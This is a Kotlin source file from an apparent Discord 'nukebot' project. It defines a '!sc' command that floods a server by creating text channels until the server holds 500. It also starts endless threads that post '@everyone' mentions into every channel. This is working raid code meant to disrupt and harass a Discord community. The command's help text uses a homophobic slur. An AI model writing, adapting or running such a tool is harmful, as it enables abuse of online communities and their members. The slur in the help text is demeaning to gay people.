package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.entities.MessageChannel
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import thenano.nukebot.bot.command.CommandListener
import java.util.concurrent.TimeUnit

@CommandListener.Info("!sc <tag(true/false) <channelName> <contents>","Create lots of channel and tag all gay in this server",false)
class SpamChannel : CommandListener() {

    @Throws(RuntimeException::class)
    override fun onEvent(event: MessageReceivedEvent) {
        if (message.contentRaw.startsWith("!sc")) {
            if (self.hasPermission(Permission.MANAGE_CHANNEL)) {
                try {
                    val index = messageRaw.indexOf(" ")
                    val index2 = messageRaw.indexOf(" ", index + 1)
                    val index3 = messageRaw.indexOf(" ",index2+ 1)
                    val tag = messageRaw.substring(index + 1, index2).equals("true")
                    val content = messageRaw.substring(index2 + 1,index3)
                    val content2 = messageRaw.substring(index3+1)

                    val channelThread = Thread(ChannelThread(content))
                    channelThread.start()
                    if (tag) {
                        for (i in 0..3) {
                            val tagThread = Thread(TagThread(content2))
                            tagThread.start()
                        }
                    }
                } catch (e: StringIndexOutOfBoundsException) {}
            }
        }
    }

    class ChannelThread(content: String) : Runnable {
        var c = content
        override fun run() {
            var i = 0
            while (guild.channels.size < 500) {
                i++
                guild.createTextChannel(c).completeAfter(500,TimeUnit.MILLISECONDS)
                //println("Created Channel { name=" + c + ",count=" + i + "}")
            }
        }
    }

    class TagThread(content: String) : Runnable {
        var c = content
        override fun run() {
            while(true) {
                for (channel in guild.channels) {
                    val channel1 = channel as MessageChannel
                    channel1.sendMessage("@everyone" + c).complete()
                }
            }
        }
    }
}